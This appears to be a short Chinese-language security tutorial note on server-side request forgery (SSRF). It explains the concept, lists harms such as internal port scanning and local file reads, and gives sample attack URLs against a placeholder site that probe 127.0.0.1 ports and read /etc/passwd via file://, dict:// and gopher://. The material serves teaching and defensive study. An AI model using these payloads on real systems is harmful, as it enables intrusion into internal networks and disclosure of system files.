## SSRF
### 1、Server-Side Request Forgery
![image](https://github.com/498946975/Security/blob/master/images/ssrf_01.png)
```yaml
1、黑客通过访问内网的web服务器，控制内网服务
2、通过中间的Web服务器，作为跳板，攻击内网其他服务
```
### 2、危害
```yaml
1、扫描内网开放服务
2、向内部任意主机的任意端口发送payload来攻击内网服务
3、DOS攻击(请求大文件，始终保持连接Keep-Alive Always) ，最后使网站功能瘫痪
4、攻击内网的web应用，例如直接SQL注入、XSS攻击等
5、利用file、gopher、dict协议读取本地文件、执行命令等
```
### 3、漏洞举例
某网站有一个在线加载功能可以把指定的远程图片加载到本地，功能链接如下:
```yaml
http://www.xxx.com/image.php?image=http://www.xxc.com/a.jpg
```
以上链接的image=http://www.xxc.com/a.jpg 参数，是服务器请求的，不是客户端请求的
### 4、攻击举例
```yaml
http://www.xxx.com/image.php?image=http://127.0.0.1:22
http://www.xxx.com/image.php?image=file:///etc/passwd （读etc/passwd文件）
http://www.xxx.com/image.php?image=dict://127.0.0.1:22/data:data2 (dict可以向服务端口请求 data data2)
http://www.xxx.com/image.php?image=gopher://127.0.0.1:2233/_test (向2233端口发送数据test, 同样可以发送POST请求)
......
```